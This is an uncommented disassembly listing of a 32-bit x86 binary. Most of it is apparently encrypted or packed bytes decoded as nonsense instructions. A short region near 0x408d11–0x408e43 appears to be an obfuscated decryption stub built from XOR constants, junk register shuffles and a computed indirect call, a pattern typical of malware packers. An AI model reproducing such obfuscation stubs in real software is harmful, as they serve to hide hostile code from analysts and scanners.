  408b9f:	jns    0x408bb7
  408ba1:	je     0x408bf3
  408ba3:	adc    al,0x41
  408ba5:	push   ss
  408ba6:	adc    al,0xaf
  408ba8:	popf   
  408ba9:	cmp    al,0xfc
  408bab:	push   ecx
  408bac:	out    0x43,eax
  408bae:	(bad)  
  408baf:	loope  0x408bd6
  408bb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bb2:	aad    0xbf
  408bb4:	dec    ebp
  408bb5:	xor    al,BYTE PTR [edx-0x1074aed6]
  408bbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bbc:	jmp    0x45de8cc6
  408bc1:	pop    ebp
  408bc2:	arpl   di,ax
  408bc4:	add    ah,BYTE PTR [edi+0x39fe80a]
  408bca:	scas   eax,DWORD PTR es:[edi]
  408bcb:	jae    0x408b9b
  408bcd:	icebp  
  408bce:	jp     0x408b9c
  408bd0:	adc    BYTE PTR [edx],ch
  408bd2:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  408bd4:	mov    al,0xae
  408bd6:	cwde   
  408bd7:	pushf  
  408bd8:	dec    ebx
  408bd9:	nop
  408bda:	mul    BYTE PTR [eax+0x49]
  408bdd:	pop    edi
  408bde:	enter  0x6c95,0xdb
  408be2:	sub    DWORD PTR [ecx-0x226d6eaa],ebp
  408be8:	dec    ebp
  408be9:	sub    BYTE PTR [edi-0x2e],al
  408bec:	repnz enter 0x1ecd,0x28
  408bf1:	stos   BYTE PTR es:[edi],al
  408bf2:	fisubr WORD PTR [edi-0x5b1017a8]
  408bf8:	xlat   BYTE PTR ds:[ebx]
  408bf9:	pop    ecx
  408bfa:	test   eax,0xfdf5b324
  408bff:	pop    ebx
  408c00:	fiadd  WORD PTR [di]
  408c03:	push   esi
  408c04:	scas   al,BYTE PTR es:[edi]
  408c05:	cmc    
  408c06:	pop    edx
  408c07:	fisub  DWORD PTR [ebp-0x21]
  408c0a:	fs pop ebp
  408c0c:	mov    ds:0x67a1eeaf,al
  408c11:	sbb    ch,dl
  408c13:	lahf   
  408c14:	inc    esi
  408c15:	cmp    ah,al
  408c17:	mov    eax,ds:0x21c9fd
  408c1c:	sbb    DWORD PTR [edx+0x2],esp
  408c1f:	mov    edx,0xd1a591f9
  408c24:	xchg   DWORD PTR [esi+eiz*2-0x667205de],esp
  408c2b:	stos   DWORD PTR es:[edi],eax
  408c2c:	sub    BYTE PTR [ebx-0x34ae62e2],al
  408c32:	jo     0x408bd2
  408c34:	push   ss
  408c35:	ficom  WORD PTR [ebp+0x4a]
  408c38:	inc    ebx
  408c39:	inc    ecx
  408c3a:	jnp    0x408c47
  408c3c:	xor    eax,0xd082e0ad
  408c41:	cmp    bh,bh
  408c43:	repz inc ebp
  408c45:	clc    
  408c46:	stos   DWORD PTR es:[edi],eax
  408c47:	stos   BYTE PTR es:[edi],al
  408c48:	(bad)  
  408c49:	stc    
  408c4a:	push   edi
  408c4b:	dec    esp
  408c4c:	sbb    DWORD PTR [eax+0x1dc1e0a2],esp
  408c52:	mov    edx,0x5f7a3a78
  408c57:	mov    ebx,0x351327ab
  408c5c:	inc    ebx
  408c5d:	(bad)  
  408c5e:	aas    
  408c5f:	push   0x6e5def6
  408c64:	xchg   bh,dh
  408c66:	cmp    al,0xb9
  408c68:	pop    ds
  408c69:	mov    ?,WORD PTR [ecx]
  408c6b:	or     cl,BYTE PTR [ebx-0x5e]
  408c6e:	mov    ah,0x9d
  408c70:	mov    eax,0xca50a08f
  408c75:	push   edi
  408c76:	cmp    al,0x48
  408c78:	test   ecx,ecx
  408c7a:	mov    WORD PTR [edx-0x5ec13fa8],gs
  408c80:	paddd  mm3,QWORD PTR [edi+0x2844376e]
  408c87:	add    eax,0x18f83002
  408c8c:	fld    DWORD PTR [edx+0x1e47464f]
  408c92:	adc    eax,0x115c2ecb
  408c97:	cld    
  408c98:	jmp    0x6bf3b377
  408c9d:	scas   eax,DWORD PTR es:[edi]
  408c9e:	push   edi
  408c9f:	cli    
  408ca0:	fs inc eax
  408ca2:	clc    
  408ca3:	out    0xaf,eax
  408ca5:	fwait
  408ca6:	leave  
  408ca7:	cmc    
  408ca8:	mov    esi,0x641fd5df
  408cad:	repnz sbb DWORD PTR [edx-0x2a3438a0],esi
  408cb4:	cli    
  408cb5:	adc    esp,DWORD PTR [ebp-0x20734b9f]
  408cbb:	mov    ds:0x45699f88,al
  408cc0:	inc    ebx
  408cc1:	jns    0x408cdd
  408cc3:	ds mov bh,dl
  408cc6:	sbb    al,0x11
  408cc8:	(bad)  
  408cc9:	jle    0x408ce2
  408ccb:	icebp  
  408ccc:	test   al,0xdf
  408cce:	in     eax,dx
  408ccf:	(bad)  
  408cd0:	outs   dx,DWORD PTR ds:[esi]
  408cd1:	fsubr  QWORD PTR [ecx]
  408cd3:	xchg   ebx,eax
  408cd4:	lock sahf 
  408cd6:	pop    esp
  408cd7:	mov    esi,0x9c60a4f8
  408cdc:	pop    ds
  408cdd:	and    cl,BYTE PTR [edx]
  408cdf:	cmp    edi,DWORD PTR [eax-0x4f]
  408ce2:	cmp    eax,0xafb26821
  408ce7:	push   eax
  408ce8:	mov    dl,BYTE PTR [esi+0x6c]
  408ceb:	xchg   esp,eax
  408cec:	xchg   ebx,eax
  408ced:	(bad)  
  408cee:	aaa    
  408cef:	icebp  
  408cf0:	mov    DWORD PTR [edx],ebx
  408cf2:	mov    ah,0x84
  408cf4:	xchg   dl,bl
  408cf6:	xlat   BYTE PTR ds:[ebx]
  408cf7:	pop    ss
  408cf8:	add    eax,0xc1210cdd
  408cfd:	jp     0x408ce4
  408cff:	dec    edx
  408d00:	addr16 pop esi
  408d02:	adc    esp,DWORD PTR [edi-0x23be7af1]
  408d08:	(bad)  
  408d09:	dec    DWORD PTR [ebx+0x5e9c6]
  408d0f:	add    BYTE PTR [eax],al
  408d11:	mov    eax,0x3272db
  408d16:	mov    ebx,0x7510893
  408d1b:	mov    ecx,DWORD PTR [ebp-0x4]
  408d1e:	xor    ecx,ebx
  408d20:	add    ecx,eax
  408d22:	mov    DWORD PTR [ebp-0xc],ecx
  408d25:	mov    ebx,0x65655
  408d2a:	add    ebx,0x3234
  408d30:	xchg   ebx,esi
  408d32:	xor    ebx,ebx
  408d34:	push   esi
  408d35:	mov    esi,ebx
  408d37:	pop    ebx
  408d38:	mov    edx,esi
  408d3a:	add    ebx,0x1002
  408d40:	lea    eax,[ebp-0x10]
  408d43:	add    edx,eax
  408d45:	add    edx,0x5
  408d48:	push   edx
  408d49:	inc    esi
  408d4a:	pop    ecx
  408d4b:	dec    ecx
  408d4c:	xchg   ecx,eax
  408d4d:	dec    eax
  408d4e:	xchg   ecx,eax
  408d4f:	dec    ecx
  408d50:	xchg   ecx,edx
  408d52:	dec    edx
  408d53:	push   edx
  408d54:	mov    edx,ebx
  408d56:	pop    ebx
  408d57:	dec    ebx
  408d58:	call   DWORD PTR [ebx]
  408d5a:	cmp    DWORD PTR [ebp+0x10],esi
  408d5d:	je     0x408d7c
  408d63:	xchg   edx,eax
  408d64:	push   0xb
  408d66:	pop    ecx
  408d67:	push   0x4
  408d69:	pop    ebx
  408d6a:	inc    ebx
  408d6b:	xchg   ebx,ecx
  408d6d:	sub    ebx,ecx
  408d6f:	xchg   ebx,ecx
  408d71:	dec    ecx
  408d72:	dec    ecx
  408d73:	mov    eax,DWORD PTR [ebp-0x1c]
  408d76:	imul   eax,ecx
  408d79:	add    esp,eax
  408d7b:	xchg   edx,eax
  408d7c:	push   eax
  408d7d:	xor    ebx,ebx
  408d7f:	mov    edx,esp
  408d81:	dec    edx
  408d82:	inc    ebx
  408d83:	add    ebx,DWORD PTR [edx+ebx*1]
  408d86:	dec    ebx
  408d87:	xor    edx,edx
  408d89:	add    DWORD PTR [ebp-0xc],ebx
  408d8c:	pop    ebx
  408d8d:	mov    eax,DWORD PTR [ebp-0xc]
  408d90:	pop    edi
  408d91:	pop    esi
  408d92:	pop    ebx
  408d93:	leave  
  408d94:	ret    0x10
  408d97:	push   ebp
  408d98:	mov    ebp,esp
  408d9a:	push   ecx
  408d9b:	xor    ecx,ecx
  408d9d:	xor    ecx,DWORD PTR ds:0x43000c
  408da3:	and    DWORD PTR ds:0x430014,ecx
  408da9:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  408db0:	mov    eax,DWORD PTR [ebp-0x4]
  408db3:	sub    edx,edx
  408db5:	mov    edx,DWORD PTR [ebp+0x10]
  408db8:	and    DWORD PTR ds:0x431014,ebx
  408dbe:	mov    ecx,0x7510893
  408dc3:	xor    eax,ecx
  408dc5:	add    eax,0x3272db
  408dca:	mov    DWORD PTR [edx],eax
  408dcc:	mov    DWORD PTR ds:0x430008,0x4f8c
  408dd6:	mov    eax,DWORD PTR [ebp+0xc]
  408dd9:	sbb    DWORD PTR ds:0x42f020,0x2880
  408de3:	xor    eax,ecx
  408de5:	and    DWORD PTR ds:0x433008,0x0
  408def:	mov    edx,DWORD PTR ds:0x433008
  408df5:	inc    edx
  408df6:	mov    DWORD PTR ds:0x433008,edx
  408dfc:	cmp    DWORD PTR ds:0x433008,0x17
  408e03:	jne    0x408e19
  408e09:	push   0x4246f1
  408e0e:	push   0x391b
  408e13:	call   DWORD PTR ds:0x42b008
  408e19:	cmp    DWORD PTR ds:0x433008,0x15
  408e20:	jb     0x408def
  408e26:	xor    DWORD PTR ds:0x43100c,edi
  408e2c:	push   esi
  408e2d:	mov    esi,DWORD PTR [ebp+0x10]
  408e30:	mov    edx,0x3272db
  408e35:	add    eax,edx
  408e37:	mov    DWORD PTR [esi+0x4],eax
  408e3a:	mov    eax,DWORD PTR [ebp+0x14]
  408e3d:	mov    esi,DWORD PTR [ebp+0x10]
  408e40:	mov    DWORD PTR [esi+0x8],eax
  408e43:	jmp    0x40b197
  408e48:	push   ebp
  408e49:	add    al,0x4c
  408e4b:	mov    al,ds:0x6365b8eb
  408e50:	add    eax,0x443327cf
  408e55:	inc    esp
  408e56:	icebp  
  408e57:	jne    0x408de3
  408e59:	sbb    DWORD PTR [edx+0x62],esp
  408e5c:	sub    ebx,DWORD PTR [edi+0x62]
  408e5f:	bound  esi,QWORD PTR [eax+ebp*2-0x7f]
  408e63:	test   al,dl
  408e65:	inc    esp
  408e66:	(bad)  
  408e67:	fild   QWORD PTR ds:0xbb165142
  408e6d:	mov    bl,0x52
  408e6f:	(bad)  
  408e71:	xchg   ebp,eax
  408e72:	ror    bl,cl
  408e74:	xchg   ebx,eax
  408e75:	lock ret 
  408e77:	pop    ds
  408e78:	scas   al,BYTE PTR es:[edi]
  408e79:	pusha  
  408e7a:	pusha  
  408e7b:	jmp    0x3fec:0x3836b5ef
  408e82:	ins    BYTE PTR es:[edi],dx
  408e83:	das    
  408e84:	loopne 0x408ee5
  408e86:	je     0x408ed0
  408e88:	adc    eax,0x13564c35
  408e8d:	shl    BYTE PTR ds:0x6c94ceee,0x82
  408e94:	add    eax,0x1ae098c6
  408e99:	pop    ecx
  408e9a:	push   edx
  408e9b:	lods   eax,DWORD PTR ds:[esi]
  408e9c:	add    ebp,DWORD PTR [ecx-0x9c72846]
  408ea2:	sub    edi,edx
  408ea4:	(bad)  
  408ea5:	jp     0x408e8d
  408ea7:	in     al,0xe6
  408ea9:	mov    eax,0x35632e5
  408eae:	mov    esi,0xea9c9cf6
  408eb3:	out    0x64,al
  408eb5:	mov    edi,0xea0dc70f
  408eba:	cmp    eax,0x3d173d8b
  408ebf:	aas    
  408ec0:	icebp  
  408ec1:	pop    ss
  408ec2:	dec    edi
  408ec3:	jno    0x408ea0
  408ec5:	out    0x8f,eax
  408ec7:	mov    ecx,0xa8b3827c
  408ecc:	loope  0x408eae
  408ece:	int    0x25
  408ed0:	sub    dl,dh
  408ed2:	loope  0x408e6f
  408ed4:	rcl    DWORD PTR [edi-0x342e8116],1
  408eda:	imul   edi,DWORD PTR ds:0x588284db,0x278f2a99
  408ee4:	mov    esp,0x9f40521d
  408ee9:	mov    ah,BYTE PTR [esi+0x4dbbf539]
  408eef:	sahf   
  408ef0:	shr    BYTE PTR [eax-0x1e],0xa6
  408ef4:	(bad)
  408ef7:	aad    0xe4
  408ef9:	stos   BYTE PTR es:[edi],al
  408efa:	add    BYTE PTR [ebp-0xd],ah
  408efd:	ss js  0x408eab
  408f00:	test   al,0xac
  408f02:	js     0x408eb0
  408f04:	push   0xffffffbe
  408f06:	leave  
  408f07:	xchg   ebp,eax
  408f08:	cmp    al,0x59
  408f0a:	sub    BYTE PTR [edi],0xb7
  408f0d:	ins    BYTE PTR es:[edi],dx
  408f0e:	fisttp WORD PTR [si]
  408f11:	out    dx,eax
  408f12:	pop    ss
  408f13:	pushf  
  408f14:	pop    eax
  408f15:	(bad)  
  408f16:	cmp    eax,0xe1300aa7
  408f1b:	loope  0x408ee3
  408f1d:	in     eax,0x5b
  408f1f:	in     al,0xa5
  408f21:	arpl   bp,bp
  408f23:	jae    0x408ee1
  408f25:	jmp    0x701c:0xe81d1a02
  408f2c:	xor    BYTE PTR [ebx-0x1a],0x93
  408f30:	fwait
  408f31:	jle    0x408fab
  408f33:	pop    ebx
  408f34:	fdivr  st(5),st
  408f36:	or     eax,0xa32c4896
  408f3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f3c:	or     al,0xeb
  408f3e:	dec    edx
  408f3f:	lods   al,BYTE PTR ds:[esi]
  408f40:	data16 lahf 
  408f42:	push   ebp
  408f43:	inc    edx
  408f44:	mov    edi,DWORD PTR [ecx-0x3f6881c0]
  408f4a:	into   
  408f4b:	sbb    ch,BYTE PTR [edx]
  408f4d:	fucomi st,st(2)
  408f4f:	and    ch,BYTE PTR [ecx]
  408f51:	dec    edi
  408f52:	push   edx
  408f53:	inc    edx
  408f54:	(bad)  
  408f55:	retf   0xc25c
  408f58:	inc    ebx
  408f59:	cmp    al,0xdd
  408f5b:	adc    DWORD PTR [edi+0x47610882],ebp
  408f61:	cmp    al,0xd7
  408f63:	in     eax,dx
  408f64:	or     eax,0x20dc637b
  408f69:	cmp    ah,BYTE PTR [edi]
  408f6b:	jb     0x408f41
  408f6d:	fidivr DWORD PTR ds:0xc32c6895
  408f73:	popa   
  408f74:	cmp    DWORD PTR [ecx+ecx*2-0x6c4b5a0d],ebp
  408f7b:	dec    esi
  408f7c:	lods   eax,DWORD PTR ds:[esi]
  408f7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f7e:	adc    ah,BYTE PTR [ebx]
  408f80:	addr16 div dh
  408f83:	jbe    0x408f49
  408f85:	push   edi
  408f86:	in     al,0xa9
  408f88:	cmp    eax,esp
  408f8a:	add    BYTE PTR [ecx],ah
  408f8c:	add    esp,DWORD PTR [edi-0x3e]
  408f8f:	push   esp
  408f90:	je     0x408f36
  408f92:	(bad)  
  408f93:	jmp    0x42cabb00
  408f98:	repz jns 0x408ff9
  408f9b:	push   esp
  408f9c:	mov    ah,0xf2
  408f9e:	xchg   esi,eax
  408f9f:	and    esp,edx
  408fa1:	jbe    0x408fc2
  408fa3:	push   ebp
  408fa4:	int3   
  408fa5:	shr    edx,1
  408fa7:	aaa    
  408fa8:	xlat   BYTE PTR ds:[ebx]
  408fa9:	mov    eax,ds:0x90d80cb4
  408fae:	dec    ebp
  408faf:	test   BYTE PTR [edi-0x72],al
  408fb2:	neg    DWORD PTR ds:0x3cf87bc2
  408fb8:	jecxz  0x408fe3
  408fba:	sbb    DWORD PTR [eax-0x1ef1c482],ecx
  408fc0:	dec    edi
  408fc1:	out    0xc3,al
  408fc3:	or     edx,DWORD PTR [ebx-0x31]
  408fc6:	sub    ch,BYTE PTR [ebp-0x76]
  408fc9:	adc    dh,BYTE PTR [eax+eiz*8-0x2e30d62e]
  408fd0:	test   BYTE PTR [edx+0x56fc50cb],bh
  408fd6:	stos   BYTE PTR es:[edi],al
  408fd7:	scas   eax,DWORD PTR es:[edi]
  408fd8:	fnsave [edx]
  408fda:	scas   eax,DWORD PTR es:[edi]
  408fdb:	aaa    
  408fdc:	in     eax,dx
  408fdd:	in     al,dx
  408fde:	mov    edi,0x8384d359
  408fe3:	call   FWORD PTR [ebx]
  408fe5:	scas   eax,DWORD PTR es:[edi]
  408fe6:	ins    DWORD PTR es:[edi],dx
  408fe7:	sbb    ah,BYTE PTR [ebp+0x61a2b694]
  408fed:	add    edx,DWORD PTR [ebx+eax*8]
  408ff0:	iret   
  408ff1:	pusha  
  408ff2:	ret    
  408ff3:	xchg   esp,eax
  408ff4:	mov    ch,0x9d
  408ff6:	inc    edi
  408ff7:	add    al,BYTE PTR [edx+0xdd36c23]
  408ffd:	cmp    dh,dh
  408fff:	repnz push ebx
  409001:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409002:	dec    esp
  409003:	push   0x14
  409005:	(bad)  
  409006:	pusha  
  409007:	jmp    0x8692:0xfd5ac9a9
  40900e:	cmc    
  40900f:	push   ebx
  409010:	sub    cl,BYTE PTR [edi+eax*1]
  409013:	add    edi,DWORD PTR [esi+0x4efd6ec6]
  409019:	rcr    DWORD PTR [ecx],cl
  40901b:	sub    BYTE PTR [ecx+0x77],0xd
  40901f:	js     0x409084
  409021:	sub    BYTE PTR [esi],bl
  409023:	test   al,0xd7
  409025:	jg     0x409088
  409027:	push   ebx
  409028:	aad    0x88
  40902a:	add    al,0xd8
  40902d:	daa    
  40902e:	adc    ebp,ebp
  409030:	mov    dl,0x26
  409032:	cmp    al,0xd3
  409034:	push   es
  409035:	add    ch,bh
  409037:	add    eax,0xb2e21bd8
  40903c:	mov    bl,0xa
  40903e:	sti    
  40903f:	cwde   
  409040:	cwde   
  409041:	loop   0x40907f
  409043:	push   es
  409044:	inc    esp
  409045:	mov    dh,0x41
  409047:	out    0x5d,eax
  409049:	xchg   ebp,eax
  40904a:	ins    DWORD PTR es:[edi],dx
  40904b:	sahf   
  40904c:	adc    edi,ecx
  40904e:	or     eax,0xe589191f
  409053:	push   edx
  409054:	adc    eax,DWORD PTR [edi+edx*2-0x31]
  409058:	mov    ah,BYTE PTR [ebp-0x489f25df]
  40905e:	gs cwde 
  409060:	sahf   
  409061:	xchg   DWORD PTR [edx],edi
  409063:	mov    dl,0x18
  409065:	lods   eax,DWORD PTR ds:[esi]
  409066:	xor    eax,0x34bebaa4
  40906b:	scas   eax,DWORD PTR es:[edi]
  40906c:	out    dx,eax
  40906d:	lods   al,BYTE PTR ds:[esi]
  40906e:	outs   dx,DWORD PTR ds:[esi]
  40906f:	repnz push ecx
  409071:	xor    DWORD PTR [ecx],edi
  409073:	loope  0x409034
  409075:	stos   BYTE PTR es:[edi],al
  409076:	xchg   BYTE PTR [edx],dl
  409078:	rcl    ch,1
  40907a:	sub    al,0xd6
  40907c:	(bad)  
  40907d:	dec    ebx
  40907e:	mov    ebp,0x61d926ec
  409083:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409084:	loop   0x4090c8
  409086:	cwde   
  409087:	(bad)  
  409088:	push   edx
  409089:	pop    esi
  40908a:	mov    eax,0xceffff1b
  40908f:	add    al,ah
  409091:	mov    ?,WORD PTR [esi+0x420c0413]
  409097:	aaa    
  409098:	xor    al,0xfe
  40909a:	shr    eax,cl
  40909c:	push   edx
  40909d:	push   ecx
  40909e:	sbb    esi,edi
  4090a0:	adc    esi,esp
  4090a2:	dec    esi
  4090a3:	mov    al,ds:0x92f2f8a6
  4090a8:	cmp    al,0x71
  4090aa:	stos   BYTE PTR es:[edi],al
  4090ab:	push   ds
  4090ac:	(bad)  
  4090ad:	int3   
  4090ae:	mov    BYTE PTR [edx-0x28ae8b35],ah
  4090b4:	fidiv  WORD PTR [eax-0x3c]
  4090b7:	add    DWORD PTR [ebx],esp
  4090b9:	mov    ecx,0xf24b421a
  4090be:	inc    esp
  4090bf:	(bad)  
  4090c0:	out    dx,eax
  4090c1:	jl     0x409106
  4090c3:	mov    edi,0xe617a5e2
  4090c8:	mov    dh,0xa4
  4090ca:	pusha  
  4090cb:	cmp    BYTE PTR [edi],bh
  4090cd:	clc    
  4090ce:	push   0xf93631b1
  4090d3:	loopne 0x4090ac
  4090d5:	int3   
  4090d6:	push   ecx
  4090d7:	jnp    0x409064
  4090d9:	or     al,0x4f
  4090db:	inc    ebp
  4090dc:	ret    0xfeec
  4090df:	mov    ds:0xa25f736b,al
  4090e4:	ins    DWORD PTR es:[edi],dx
  4090e5:	push   eax
  4090e6:	cmp    DWORD PTR [esi+0xa],esi
  4090e9:	xor    BYTE PTR [ecx],bh
  4090eb:	test   BYTE PTR [edx-0x4d84ce5c],al
  4090f1:	popf   
  4090f2:	pop    ebp
  4090f3:	and    al,0x4
  4090f5:	lods   al,BYTE PTR ds:[esi]
  4090f6:	push   ss
  4090f7:	sbb    BYTE PTR [ebp-0x44],bh
  4090fa:	shl    DWORD PTR [ebx+ebp*8],0x86
  4090fe:	(bad)  [edx-0x20]
  409101:	add    al,0xa0
  409103:	fs clc 
  409105:	retf   0x3ab0
  409108:	ins    DWORD PTR es:[edi],dx
  409109:	mov    DWORD PTR [esi+edx*2],esp
  40910c:	add    eax,0xc4494f98
  409111:	xor    eax,0x5c48ed1
  409116:	lds    ebp,FWORD PTR [edi+esi*4+0x6b]
  40911a:	mov    bh,0x8a
  40911c:	into   
  40911d:	in     eax,dx
  40911e:	cmc    
  40911f:	data16 (bad) 
  409121:	daa    
  409122:	jnp    0x4090f4
  409124:	sbb    ebp,ebx
  409126:	mov    BYTE PTR [eax+eax*8],cl
  409129:	and    al,0xf6
  40912b:	fimul  DWORD PTR [ebx+0x12]
  40912e:	or     edx,DWORD PTR [eax+ebp*8]
  409131:	add    ebp,DWORD PTR [edx-0x4d20c131]
  409137:	(bad)  
  409138:	or     ebp,DWORD PTR ds:0xf0541d24
  40913e:	mul    DWORD PTR [edx-0x6b]
  409141:	call   0x8358:0x720f141f
  409148:	sbb    BYTE PTR [edi],bh
  40914a:	mov    dl,0xb
  40914c:	sub    eax,0x4a6a721d
  409151:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409152:	push   esi
  409153:	sub    ch,BYTE PTR [eax-0x7f]
  409156:	lds    edi,FWORD PTR [ebx+ebx*8]
  409159:	sbb    eax,0x83d46377
  40915e:	scas   al,BYTE PTR es:[edi]
  40915f:	cmp    ch,BYTE PTR [eax+0x5c]
  409162:	sub    DWORD PTR [eax+0x7951deb8],esi
  409168:	push   0x3682e8eb
  40916d:	add    ecx,DWORD PTR [edx-0xf75301a]
  409173:	daa    
  409174:	push   ss
  409175:	or     al,BYTE PTR [edx+0x4edb4c9a]
  40917b:	push   eax
  40917c:	fldenv [esi+0x3b]
  40917f:	popf   
  409180:	repz retf 0x7fe2
  409184:	in     al,dx
  409185:	sbb    DWORD PTR [ecx-0x1b],esi
  409188:	push   eax
  409189:	mov    dh,0xdc
  40918b:	outs   dx,DWORD PTR ds:[esi]
  40918c:	inc    esp
  40918d:	int    0xc
  40918f:	(bad)  
  409190:	pop    ebx
  409191:	mov    ds:0xf6e807f4,al
  409196:	(bad)  
  409198:	add    al,0x51
  40919a:	mov    ch,0xa4
  40919c:	jp     0x4091f9
  40919e:	inc    ebp
  40919f:	(bad)  [ecx+0x5]
  4091a2:	sbb    esi,DWORD PTR [edx+0x7484b110]
  4091a8:	mov    ds:0x3b76a836,al
  4091ad:	out    dx,eax
  4091ae:	(bad)  
  4091b0:	mov    ecx,0x6223b1b1
  4091b5:	daa    
  4091b6:	cmp    eax,0xc547aaa7
  4091bb:	out    dx,al
  4091bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091bd:	sub    ch,ch
  4091bf:	(bad)  
  4091c0:	adc    ch,dl
  4091c2:	call   DWORD PTR [ecx]
  4091c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091c5:	les    edi,FWORD PTR [edx+0x1]
  4091c8:	and    DWORD PTR [ecx-0x42aa4a35],eax
  4091ce:	push   cs
  4091cf:	faddp  st(5),st
  4091d1:	int3   
  4091d2:	into   
  4091d3:	outs   dx,DWORD PTR ds:[esi]
  4091d4:	icebp  
  4091d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091d6:	cmp    ah,BYTE PTR [edx-0x454464db]
  4091dc:	and    eax,0x16286b05
  4091e1:	push   cs
  4091e2:	repnz pusha 
  4091e4:	dec    esi
  4091e5:	cmp    esi,ecx
  4091e7:	cdq    
  4091e8:	inc    edi
  4091e9:	cmp    dl,0x12
  4091ec:	mov    esi,0x4bd1a09e
  4091f1:	mov    cl,0x57
  4091f3:	mov    DWORD PTR [eax+eiz*2-0x4e7d7f06],edx
  4091fa:	jl     0x4091e0
  4091fc:	sar    esp,cl
  4091fe:	nop
  4091ff:	dec    ecx
  409200:	pop    esp
  409201:	fsub   DWORD PTR [esi-0x6b]
  409204:	arpl   si,ax
  409206:	inc    ebx
  409207:	sbb    BYTE PTR [ebp-0x5f],dl
  40920a:	fs jo  0x40927e
  40920d:	mov    cl,0x24
  40920f:	test   eax,0x21ab0189
  409214:	cli    
  409215:	rcr    DWORD PTR [ebp+0x4d],0x9c
  409219:	mov    ebx,0x7b57f31
  40921e:	inc    ecx
  40921f:	xor    bh,ah
  409221:	mov    dh,0xf6
  409223:	in     al,dx
  409224:	adc    BYTE PTR [esi+0x63],al
  409227:	in     eax,0xe4
  409229:	(bad)  
  40922a:	cmp    dl,bl
  40922c:	(bad)  
  40922d:	pop    esi
  40922e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40922f:	push   esp
  409230:	adc    DWORD PTR [edx],esi
  409232:	mov    eax,ds:0x953cb2f1
  409237:	cmp    ch,BYTE PTR [edx+0x48]
  40923a:	(bad)  
  40923b:	jmp    0x409255
  40923d:	or     dh,cl
  40923f:	jne    0x4091f8
  409241:	dec    ebx
  409242:	outs   dx,DWORD PTR ds:[esi]
  409243:	push   esi
  409244:	arpl   dx,ax
  409246:	lock mov ecx,0x15b58d67
  40924c:	sbb    DWORD PTR [eax],ebx
  40924e:	(bad)
  409252:	and    ch,BYTE PTR [ecx+ebp*2]
  409255:	xor    esi,esp
  409257:	xor    ebp,DWORD PTR [esi]
  409259:	push   esi
  40925a:	fisttp QWORD PTR [ebp-0x5a]
  40925d:	lods   al,BYTE PTR ds:[esi]
  40925e:	je     0x4092c6
  409260:	push   esi
  409261:	shl    BYTE PTR [ebx-0x1d],cl
  409264:	lahf   
  409265:	loop   0x409263
  409267:	inc    ecx
  409268:	mov    al,ds:0xd2781e2a
  40926d:	inc    edi
  40926e:	cmp    DWORD PTR [edi+0x73],ecx
  409271:	inc    esp
  409272:	adc    bl,ah
  409274:	lea    ebx,[esi+0x2698119c]
  40927a:	inc    edi
  40927b:	push   esp
  40927c:	jo     0x40926c
  40927e:	dec    edi
  40927f:	ja     0x409297
  409281:	sbb    BYTE PTR [esi+0x5a],bh
  409284:	in     al,0xe1
  409286:	jne    0x4092ad
  409288:	push   edi
  409289:	inc    edx
  40928a:	add    al,0xef
  40928c:	and    esi,edi
  40928e:	aaa    
  40928f:	mov    ah,0x85
  409291:	xchg   edx,eax
  409292:	bound  esp,QWORD PTR [ebx]
  409294:	sbb    DWORD PTR [eax-0x73e63207],edi
  40929a:	pop    esp
  40929b:	and    DWORD PTR [eax],edx
  40929d:	cwde   
  40929e:	adc    cl,dl
  4092a0:	dec    DWORD PTR [eax-0x14]
  4092a3:	loopne 0x40927c
  4092a5:	js     0x4092a2
  4092a7:	add    ebp,DWORD PTR [eax-0x28]
  4092aa:	push   cs
  4092ab:	cmp    dl,BYTE PTR [edi+0xbadfee9]
  4092b1:	mov    DWORD PTR [esi],esi
  4092b3:	cmp    cl,bl
  4092b5:	push   ecx
  4092b6:	test   eax,0xd372feb7
  4092bb:	xchg   ecx,eax
  4092bc:	pop    edi
  4092bd:	dec    edx
  4092be:	icebp  
  4092bf:	test   DWORD PTR ds:0x3e7e39f9,0x8a252f44
  4092c9:	test   DWORD PTR [edi+0x43],eax
  4092cc:	arpl   dx,di
  4092ce:	jmp    0xc7c1f269
  4092d3:	aam    0x11
  4092d5:	mov    al,0xc4
  4092d7:	imul   ebx,DWORD PTR [ebp+0x26],0x21f50121
  4092de:	jmp    0x62b143fb
  4092e3:	mov    al,0xd9
  4092e5:	arpl   WORD PTR [edi-0x4a],cx
  4092e8:	int3   
  4092e9:	inc    ecx
  4092ea:	test   eax,0xe45b2d21
  4092ef:	jmp    0x4b2eeee
  4092f4:	out    0x84,al
  4092f6:	daa    
  4092f7:	mov    bh,0x25
  4092f9:	inc    ebx
  4092fa:	hlt    
  4092fb:	cwde   
  4092fc:	fs loop 0x40930f
  4092ff:	xor    esp,DWORD PTR [ebx+edi*8+0x2667ed3a]
  409306:	sahf   
  409307:	mov    dh,BYTE PTR [edi-0xb]
  40930a:	dec    esp
  40930b:	in     al,dx
  40930c:	bound  esi,QWORD PTR [edx-0x1b]
  40930f:	sub    eax,DWORD PTR [edx]
  409311:	pusha  
  409312:	push   edx
  409313:	or     al,0xe5
  409315:	mul    BYTE PTR [edi+ecx*1]
  409318:	mov    esi,0x820990f9
  40931d:	jns    0x4092f4
  40931f:	or     esp,DWORD PTR [eax+0x62]
  409322:	call   0x2322b70d
  409327:	push   ebp
  409328:	or     BYTE PTR [ecx+eiz*1-0x34],al
  40932c:	inc    ecx
  40932d:	push   edi
  40932e:	stc    
  40932f:	loopne 0x4093a7
  409331:	push   ds
  409332:	fs xchg edx,eax
  409334:	mov    ds:0x8bd46f6e,eax
  409339:	xor    BYTE PTR [esi-0x69],ah
  40933c:	inc    edi
  40933d:	popa   
  40933e:	repnz or eax,0x706a4792
  409344:	mov    ebp,0xecd5b91f
  409349:	out    dx,eax
  40934a:	call   0x2596436e
  40934f:	pushf  
